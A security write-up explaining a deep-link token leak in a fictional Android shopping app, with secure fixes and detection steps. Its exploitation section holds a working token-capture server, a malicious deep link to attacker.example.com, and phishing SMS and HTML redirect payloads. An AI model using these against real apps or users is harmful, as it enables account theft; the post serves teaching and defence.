---
title: "One-Click Account Takeover via Deep Link Token Auto-Append"
description: "When an Android app silently attaches authentication tokens to every URL opened through a deep link, a single click is all it takes."
date: 2026-01-22
tags: ["android", "mobile-security", "deep-links", "account-takeover", "bugbounty"]
---

## Introduction

Deep links are one of the most underestimated attack surfaces in mobile applications. They function as externally controlled input that triggers internal behavior -- an ideal target for exploitation. When a developer assumes that deep link parameters are trustworthy, the consequences can be severe.

In this writeup, I walk through a vulnerability where a crafted deep link forces an Android app to open an attacker-controlled URL inside a WebView, with the user's authentication token silently auto-appended as a query parameter. The result is a one-click account takeover.

The fictional app used throughout this post is **SomeQuickCart**, a mobile shopping application. The vulnerability class, however, is very real and appears across production apps regularly.

## How Deep Links Work in Android

Android supports three types of deep links:

1. **Custom URI Schemes** -- App-specific schemes like `myapp://path`. Any app can register any scheme, and there is no ownership verification.
2. **App Links** -- HTTPS-based links verified through a Digital Asset Links file hosted at `/.well-known/assetlinks.json`. These provide verified ownership.
3. **Intent URIs** -- Links using the `intent://` scheme that encode an Android Intent, allowing callers to specify the target component, action, extras, and more.

SomeQuickCart registers a custom URI scheme in its `AndroidManifest.xml`:

```xml
<activity
    android:name=".ui.deeplink.DeepLinkActivity"
    android:exported="true"
    android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="android" android:host="somequickcart" />
    </intent-filter>
</activity>
```

The critical attributes here are `android:exported="true"` and `android:scheme="android"` with `android:host="somequickcart"`. This means any application on the device -- or any link clicked in a browser -- can invoke this activity by opening a URL that starts with `android://somequickcart`.

## The Deep Link Parameter Structure

When `DeepLinkActivity` receives an intent, it extracts several query parameters from the URI:

```java
public class DeepLinkActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri data = getIntent().getData();
        if (data == null) {
            finish();
            return;
        }

        String page = data.getQueryParameter("page");
        String objectId = data.getQueryParameter("objectId");
        String isPush = data.getQueryParameter("isPush");
        String objectType = data.getQueryParameter("objectType");

        handleDeepLink(page, objectId, isPush, objectType);
    }
}
```

The parameters control navigation within the app:

| Parameter    | Purpose                                           |
|--------------|---------------------------------------------------|
| `page`       | Determines which screen or handler to invoke      |
| `objectId`   | Identifies a specific resource (product, order)   |
| `isPush`     | Indicates whether the link came from a push notification |
| `objectType` | Provides additional context -- or in one case, a URL |

When `page=webview`, the app treats `objectType` as a URL and opens it in an internal WebView. This is where the vulnerability lives. There is no validation on what URL is provided.

```java
private void handleDeepLink(String page, String objectId, String isPush, String objectType) {
    switch (page) {
        case "product":
            openProductDetail(objectId);
            break;
        case "category":
            openCategory(objectId);
            break;
        case "webview":
            openWebView(objectType); // objectType is treated as a raw URL
            break;
        case "order":
            openOrderDetail(objectId);
            break;
        default:
            openHome();
            break;
    }
}
```

## The Critical Flaw: Automatic Token Appending

The `openWebView` method does not just load the URL. It retrieves the user's authentication token from `SessionManager` and unconditionally appends it as a query parameter to whatever URL is about to be loaded:

```java
private void openWebView(String url) {
    if (url == null || url.isEmpty()) {
        openHome();
        return;
    }

    String authToken = SessionManager.getInstance().getAuthToken();

    if (authToken != null && !authToken.isEmpty()) {
        if (url.contains("?")) {
            url = url + "&user_tmp_param1=" + authToken;
        } else {
            url = url + "?user_tmp_param1=" + authToken;
        }
    }

    Intent intent = new Intent(this, WebViewActivity.class);
    intent.putExtra("load_url", url);
    startActivity(intent);
    finish();
}
```

There is no domain allowlist. No HTTPS enforcement. No check of any kind. If the user is logged in, their token is appended to the URL -- even if that URL points to an attacker-controlled server.

The token parameter name `user_tmp_param1` suggests it may have been intended as a temporary implementation, but it shipped to production.

## Exploitation Walkthrough

### Step 1: Set Up an Attacker Server

The attacker needs a server to capture the token. A minimal Python HTTP server is sufficient:

```python
#!/usr/bin/env python3
"""Capture leaked authentication tokens from query parameters."""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime


class TokenCaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        token = params.get("user_tmp_param1", [None])[0]

        if token:
            timestamp = datetime.now().isoformat()
            client_ip = self.client_address[0]
            print(f"[{timestamp}] Token captured from {client_ip}: {token}")

            with open("captured_tokens.log", "a") as f:
                f.write(f"{timestamp} | {client_ip} | {token}\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Loading...</h1></body></html>")

    def log_message(self, format, *args):
        pass  # Suppress default logging


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), TokenCaptureHandler)
    print("[*] Listening for tokens on port 8080...")
    server.serve_forever()
```

### Step 2: Craft the Malicious Deep Link

The deep link combines the app's URI scheme with the `webview` page type and the attacker's URL as the `objectType`:

```
android://somequickcart?page=webview&objectId=14833&isPush=true&objectType=https://attacker.example.com
```

Breaking it down:

- `android://somequickcart` -- triggers the exported `DeepLinkActivity`
- `page=webview` -- routes to the WebView handler
- `objectId=14833` -- an arbitrary value, ignored by the WebView path
- `isPush=true` -- mimics a push notification origin for social engineering
- `objectType=https://attacker.example.com` -- the attacker's server, treated as the URL to load

### Step 3: Deliver the Link

The deep link can be delivered through multiple channels:

**SMS / Messaging:**
```
Your SomeQuickCart order #14833 has a delivery update:
android://somequickcart?page=webview&objectId=14833&isPush=true&objectType=https://attacker.example.com
```

**HTML redirect (for email or web delivery):**
```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh"
          content="0;url=android://somequickcart?page=webview&objectId=14833&isPush=true&objectType=https://attacker.example.com">
</head>
<body>
    <p>Redirecting to your order details...</p>
</body>
</html>
```

**ADB for testing:**
```bash
adb shell am start -a android.intent.action.VIEW \
    -d "android://somequickcart?page=webview\&objectId=14833\&isPush=true\&objectType=https://attacker.example.com"
```

### Step 4: The Attack Executes

When the victim clicks the link, the following chain fires:

1. Android resolves `android://somequickcart` to `DeepLinkActivity`
2. `DeepLinkActivity` extracts `page=webview` and `objectType=https://attacker.example.com`
3. `openWebView()` retrieves the auth token from `SessionManager`
4. The token is appended: `https://attacker.example.com?user_tmp_param1=eyJhbGciOi...`
5. `WebViewActivity` loads the URL -- sending the token to the attacker's server
6. The attacker captures the token and can now impersonate the victim

The entire chain executes from a single click. No user interaction is required beyond tapping the link.

## Why Query Parameter Token Leakage Is Especially Dangerous

Sending tokens as URL query parameters creates multiple exposure points beyond the immediate request:

**Server Access Logs:**

Every web server logs the full request URL by default. The token is now persisted in plain text in log files:

```
192.168.1.50 - - [18/Feb/2026:14:32:01 +0000] "GET /?user_tmp_param1=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0MjN9.abc123 HTTP/1.1" 200 1024
```

These logs may be stored indefinitely, backed up to secondary systems, aggregated by log management platforms, and accessible to operations staff who should never see authentication tokens.

**Referer Header Leakage:**

If the page loaded in the WebView contains any external resources -- images, scripts, stylesheets, analytics -- the browser sends the full URL as the `Referer` header:

```http
GET /analytics.js HTTP/1.1
Host: cdn.third-party.com
Referer: https://attacker.example.com/?user_tmp_param1=eyJhbGciOiJIUzI1NiJ9...
```

The token now leaks to every third-party domain referenced by the page. The attacker does not even need to parse the request -- the token proliferates on its own.

## Technical Root Cause Analysis

This vulnerability results from three independent failures, each of which would have been sufficient to prevent exploitation if addressed:

### Failure 1: No URL Validation in the Deep Link Handler

The `objectType` parameter is passed directly to `openWebView()` without any validation. The handler accepts arbitrary schemes, domains, and paths.

```java
// What the code does:
openWebView(objectType); // objectType = "https://attacker.example.com"

// What it should do:
if (isAllowedUrl(objectType)) {
    openWebView(objectType);
} else {
    Log.w(TAG, "Blocked unauthorized URL in deep link: " + objectType);
    openHome();
}
```

### Failure 2: Unconditional Token Appending

The `openWebView` method appends the authentication token to every URL regardless of destination. There is no check on whether the URL belongs to SomeQuickCart's own infrastructure.

```java
// The token is appended to ANY URL, including attacker-controlled ones
if (authToken != null && !authToken.isEmpty()) {
    url = url + "?user_tmp_param1=" + authToken;
}
```

### Failure 3: Token Sent as Query Parameter Instead of Header

Even if the URL were validated, sending tokens as query parameters is inherently unsafe. Tokens in URLs are logged, cached, leaked via Referer headers, and visible in browser history.

## Secure Implementation

### Fix 1: Strict URL Allowlisting with HTTPS Enforcement

Validate the URL against an allowlist of trusted domains before opening it:

```java
private static final Set<String> ALLOWED_DOMAINS = Set.of(
    "www.somequickcart.com",
    "m.somequickcart.com",
    "help.somequickcart.com"
);

private boolean isAllowedUrl(String url) {
    if (url == null || url.isEmpty()) {
        return false;
    }

    try {
        URI uri = new URI(url);
        String scheme = uri.getScheme();
        String host = uri.getHost();

        if (!"https".equalsIgnoreCase(scheme)) {
            Log.w(TAG, "Rejected non-HTTPS URL: " + url);
            return false;
        }

        if (host == null) {
            return false;
        }

        // Normalize and check against allowlist
        host = host.toLowerCase(Locale.ROOT);
        return ALLOWED_DOMAINS.contains(host);

    } catch (URISyntaxException e) {
        Log.e(TAG, "Malformed URL in deep link: " + url, e);
        return false;
    }
}
```

### Fix 2: Conditional Token Attachment with Domain Verification Using HTTP Headers

Only attach credentials when navigating to a trusted domain, and use HTTP headers instead of query parameters:

```java
private void openWebView(String url) {
    if (!isAllowedUrl(url)) {
        Log.w(TAG, "Blocked unauthorized WebView URL: " + url);
        openHome();
        return;
    }

    Intent intent = new Intent(this, WebViewActivity.class);
    intent.putExtra("load_url", url);

    // Signal that this is a trusted URL eligible for token injection via header
    intent.putExtra("attach_auth", true);
    startActivity(intent);
    finish();
}
```

In `WebViewActivity`, override the resource loading to inject the token as a header:

```java
webView.setWebViewClient(new WebViewClient() {
    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
        String host = request.getUrl().getHost();
        if (host != null && ALLOWED_DOMAINS.contains(host.toLowerCase(Locale.ROOT))) {
            try {
                URL reqUrl = new URL(request.getUrl().toString());
                HttpURLConnection conn = (HttpURLConnection) reqUrl.openConnection();
                conn.setRequestMethod(request.getMethod());

                String token = SessionManager.getInstance().getAuthToken();
                if (token != null) {
                    conn.setRequestProperty("Authorization", "Bearer " + token);
                }

                return new WebResourceResponse(
                    conn.getContentType(),
                    conn.getContentEncoding(),
                    conn.getInputStream()
                );
            } catch (Exception e) {
                Log.e(TAG, "Request interception failed", e);
            }
        }
        return super.shouldInterceptRequest(view, request);
    }
});
```

### Fix 3: WebView Navigation Interception

Prevent the WebView from navigating away from trusted domains after the initial load:

```java
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        String host = request.getUrl().getHost();
        if (host == null || !ALLOWED_DOMAINS.contains(host.toLowerCase(Locale.ROOT))) {
            Log.w(TAG, "Blocked WebView navigation to untrusted domain: " + request.getUrl());
            // Optionally open in external browser without tokens
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, request.getUrl());
            startActivity(browserIntent);
            return true; // Block the navigation in WebView
        }
        return false; // Allow navigation to trusted domains
    }
});
```

### Fix 4: Replace Query Parameter Tokens with Headers, POST Body, or Cookies

If the backend must receive authentication context from the WebView, use one of these alternatives:

| Method              | Visibility in Logs | Referer Leakage | Cache Risk | Recommendation     |
|---------------------|--------------------|-----------------|------------|--------------------|
| Query Parameter     | Yes                | Yes             | Yes        | Never use          |
| Authorization Header| No                 | No              | No         | Preferred          |
| POST Body           | No                 | No              | No         | Good alternative   |
| HttpOnly Cookie     | No                 | No              | Controlled | Good for WebViews  |

## Detection Methods

### Static Analysis

Search the codebase for patterns that indicate deep link parameters being used in URL construction:

```bash
# Find deep link handlers
grep -rn "getQueryParameter" --include="*.java" --include="*.kt" .

# Find WebView URL loading
grep -rn "loadUrl\|load_url\|loadData" --include="*.java" --include="*.kt" .

# Find token appending to URLs
grep -rn "getAuthToken\|getAccessToken\|getSessionToken" --include="*.java" --include="*.kt" . | \
    grep -i "url\|param\|query"

# Find exported activities with deep link intent filters
grep -rn "android:exported=\"true\"" --include="*.xml" .
```

### Dynamic Analysis with ADB

Test deep link handlers by sending intents directly:

```bash
# List all registered deep link schemes for the app
adb shell dumpsys package com.somequickcart.app | grep -A 5 "intent-filter"

# Test with a benign external URL to check for token leakage
adb shell am start -a android.intent.action.VIEW \
    -d "android://somequickcart?page=webview\&objectType=https://httpbin.org/get"

# Inspect the request at httpbin.org/get to see if tokens appear in the URL

# Monitor network traffic for token leakage
adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap
```

## Broader Patterns: Deep Link Security

This vulnerability is one instance of a broader class of deep link security issues. Here are six common patterns to audit for:

1. **Open Redirect via Deep Link** -- A deep link parameter controls navigation to an arbitrary URL. The app acts as an open redirector, which can be chained with phishing or OAuth token theft.

2. **Token Leakage via WebView** -- Authentication tokens are attached to URLs loaded in a WebView without domain validation. This is the pattern covered in this post.

3. **JavaScript Injection via Deep Link** -- A deep link parameter is interpolated into JavaScript executed in a WebView (e.g., `webView.evaluateJavascript("setPage('" + param + "')")`). An attacker injects arbitrary JavaScript.

4. **Local File Access via Deep Link** -- A deep link causes the WebView to load a `file://` URI, potentially exposing local application files including shared preferences, databases, or cached credentials.

5. **Intent Injection via Deep Link** -- Deep link parameters are used to construct an internal Intent without validation. An attacker can target unexported components or pass crafted extras to change application behavior.

6. **Parameter Injection in API Calls** -- Deep link parameters are inserted into backend API requests without sanitization. An attacker modifies API behavior by injecting additional parameters or altering existing ones.

When auditing any mobile application, deep link handlers should be treated with the same scrutiny as any other external input boundary.

## Key Takeaways

- **Deep links are external inputs.** They are controlled by the caller, not by the app. Every parameter extracted from a deep link URI must be validated before use.

- **Automatic credential attachment is dangerous.** Appending authentication tokens to URLs without verifying the destination is equivalent to handing credentials to any server an attacker chooses.

- **Query parameters are the worst transport for secrets.** Tokens in URLs leak through server logs, Referer headers, browser history, proxy logs, and cache storage. Use Authorization headers, POST bodies, or HttpOnly cookies instead.

- **Defense in depth is not optional.** A single validation layer is not sufficient. URL allowlisting, conditional token attachment, WebView navigation interception, and secure token transport should all be implemented together.

A single missing domain check turned a convenience feature into a one-click account takeover. The fix requires minutes. The impact of not fixing it is complete account compromise at scale.
